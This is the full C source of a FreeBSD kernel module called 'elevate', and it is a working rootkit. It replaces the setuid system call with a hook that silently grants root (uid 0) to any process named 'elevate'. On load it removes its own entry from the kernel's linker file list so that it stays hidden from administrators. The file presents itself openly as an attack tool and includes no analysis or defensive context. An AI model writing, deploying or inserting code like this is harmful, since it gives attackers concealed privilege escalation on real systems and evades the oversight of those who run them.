#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/ucred.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>

static sy_call_t *original_setuid;

static int hooked_setuid(struct thread *td, void *syscall_args) {
	char *name = "elevate";
	struct ucred *newcred;
	struct ucred *oldcred;
	struct proc *p = td->td_proc;

	if (strcmp(p->p_comm, name) != 0) {
		return (original_setuid(td, syscall_args));
	}
	newcred = crget();
	PROC_LOCK(p);
	oldcred = crcopysafe(p, newcred);

	newcred->cr_uid = 0;
	newcred->cr_ruid = 0;

	proc_set_cred(p, newcred);
	PROC_UNLOCK(p);
	crfree(oldcred);
	return (0);
}
// Load/unload event handler.
static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		original_setuid = sysent[SYS_setuid].sy_call;
		sysent[SYS_setuid].sy_call = (sy_call_t *)hooked_setuid;

		sx_xlock(&linker_lock);

		//unlink the file to hide it
		struct linker_file *linker_file;
		TAILQ_FOREACH(linker_file, &linker_files, link) {
			if (linker_file->filename != NULL && strcmp(linker_file->filename, "elevate.ko") == 0) {
				TAILQ_REMOVE(&linker_files, linker_file, link);
				break;
			}
		}
		sx_xunlock(&linker_lock);

		break;
	case MOD_UNLOAD:
		sysent[SYS_setuid].sy_call = original_setuid;

		break;
	default:
		error = EOPNOTSUPP;

		break;
	}
	return error;
}

static moduledata_t elevate_mod = {
	"elevate", // name
	load, // event handler
	NULL // extras
};

DECLARE_MODULE(elevate, elevate_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);